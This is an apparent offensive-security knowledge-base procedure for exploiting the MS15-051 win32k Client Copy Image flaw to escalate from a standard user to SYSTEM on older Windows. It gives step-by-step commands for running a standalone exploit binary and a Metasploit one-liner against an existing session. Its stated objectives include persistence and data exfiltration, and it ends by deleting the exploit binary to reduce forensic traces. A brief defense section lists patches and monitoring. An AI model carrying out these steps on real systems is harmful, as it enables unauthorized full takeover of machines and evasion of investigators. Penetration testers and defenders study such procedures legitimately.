---
type: procedure
description: >-
  Exploit the MS15-051 vulnerability in the Windows kernel's Client Copy Image
  functionality to escalate privileges from a low-integrity process to SYSTEM.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Exploitation for Privilege Escalation|T1068 - Exploitation for
    Privilege Escalation]]
sub_techniques: []
tags:
  - '[[tags/EoP - Common Vulnerabilities and Exposure]]'
  - '[[tags/MS15-051 (Client Copy Image) - Microsoft Windows 2003/2008/7/8/2012]]'
  - '[[tags/Windows - Privilege Escalation]]'
commands:
  - '[[commands/run-ms15-051-standalone-exploit]]'
  - '[[commands/use-msfconsole-ms15-051-module]]'
platforms:
  - Windows
tools:
  - '[[tools/Metasploit-Framework]]'
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
---

# MS15-051-Privilege-Escalation-via-Client-Copy-Image

## Summary

This procedure exploits the MS15-051 vulnerability in the Windows kernel's Client Copy Image functionality, allowing an attacker with initial code execution on a vulnerable system to escalate privileges to SYSTEM level. Applicable to Windows 2003, 2008, 7, 8, and 2012, it enables full system control for data theft, persistence, or lateral movement.

## Description

MS15-051 is a privilege escalation vulnerability stemming from improper handling of Client Copy Image operations in the Windows kernel (win32k.sys). An attacker can trigger a use-after-free condition to overwrite kernel memory, hijacking execution flow to run arbitrary code with SYSTEM privileges. This requires local code execution but no administrative rights initially. Successful exploitation grants kernel-level access, allowing installation of backdoors, data exfiltration, or further network compromise. The target environment includes unpatched Windows systems from the specified versions; modern Windows (post-2012 with patches) are unaffected. Detection is challenging without kernel monitoring, but anomalous process elevations or memory anomalies may indicate exploitation.

## Requirements

1. Local code execution access on a vulnerable Windows system (e.g., via initial access vector like phishing or drive-by download).
2. Target OS: Windows 2003, 2008, 7, 8, or 2012 (unpatched; verify via [[commands/systeminfo-windows]]).
3. Architecture match: 32-bit or 64-bit exploit binary corresponding to the target system.
4. For Metasploit method: Installed Metasploit Framework on the attacker's machine with network access to the target (for session management).
5. Low-integrity process context (e.g., standard user shell).

## Defense

- Apply Microsoft security updates, specifically the MS15-051 patch (KB3042553 or later) to all Windows systems.
- Implement privilege access management (PAM) and least-privilege principles to limit low-integrity process capabilities.
- Deploy endpoint detection and response (EDR) tools monitoring for kernel memory anomalies, unexpected SYSTEM process spawns, or exploit signatures (e.g., win32k.sys accesses).
- Enable Windows Defender Exploit Guard and Credential Guard to mitigate kernel exploits.
- Regularly audit unpatched legacy systems and restrict local code execution via AppLocker or similar.

## Objectives

1. Escalate privileges from a low-integrity user context to SYSTEM on the target Windows machine.
2. Verify escalation by executing privileged commands (e.g., whoami /priv).
3. Establish persistence or exfiltrate data using the elevated context.

## Instructions

### Step 1: Verify Target Vulnerability and Prepare Exploit

**Context**: Confirm the system is vulnerable and download the appropriate exploit binary or prepare Metasploit. Use systeminfo to check OS version and architecture; MS15-051 affects Windows 2003-2012 unpatched systems.

Run the following to gather system details:

```cmd
systeminfo
```

> This command outputs OS version, build, and architecture. Look for Windows versions prior to patches (e.g., Windows 7 without KB3042553). Expected output includes lines like "OS Name: Microsoft Windows 7 Professional" and "System Type: x64-based PC".

Download the standalone exploit from a trusted repository (e.g., GitHub SecWiki) matching the architecture. Transfer it to the target via existing access (e.g., SMB share or initial shell).

### Step 2: Execute Standalone Exploit for Privilege Escalation

**Context**: Run the pre-compiled MS15-051 exploit binary to trigger the kernel vulnerability and execute a payload command as SYSTEM. This method is direct and doesn't require additional tools on the target.

**Command** ([[commands/run-ms15-051-standalone-exploit]]):

```cmd
ms15-051.exe "whoami /all"
```

> The command invokes the exploit binary (ms15-051.exe) with a payload string, such as "whoami /all", which executes under SYSTEM privileges post-exploitation. The exploit overwrites kernel structures to elevate the calling process. Expected output: Standard console output from the payload (e.g., detailed user/group info showing NT AUTHORITY\SYSTEM), followed by potential BSOD if unstable—test in a lab first. If successful, the shell prompt changes to indicate SYSTEM context.

If the standalone fails (e.g., due to ASLR/DEP), proceed to the Metasploit method.

### Step 3: Alternative - Use Metasploit Module for Reliable Escalation

**Context**: Leverage the Metasploit Framework's ms15_051_client_copy_image module for a more stable exploitation, especially if a Meterpreter session is already established. This handles session management and payload delivery automatically.

First, start msfconsole and use the module:

**Command** ([[commands/use-msfconsole-ms15-051-module]]):

```bash
msfconsole -q -x "use exploit/windows/local/ms15_051_client_copy_image; set SESSION 1; exploit"
```

> This launches Metasploit quietly (-q), uses the specified module, sets the target session ID (e.g., 1 from an existing Meterpreter session), and runs the exploit. The module triggers the Client Copy Image flaw to spawn a new SYSTEM shell. Expected output: "[*] Started reverse TCP handler on 0.0.0.0:4444", followed by a new Meterpreter session as SYSTEM. Verify with "getuid" showing "NT AUTHORITY\SYSTEM".

### Step 4: Verify Escalation and Cleanup

**Context**: Confirm privilege escalation succeeded and optionally clean up artifacts to maintain stealth.

Execute a privileged command to validate:

```cmd
whoami /priv
```

> Expected output lists privileges like SeDebugPrivilege, SeLoadDriverPrivilege enabled for NT AUTHORITY\SYSTEM, confirming escalation. If using Metasploit, run "shell" to drop to a SYSTEM cmd.exe.

Delete the exploit binary post-use: `del ms15-051.exe` to reduce forensic footprints.
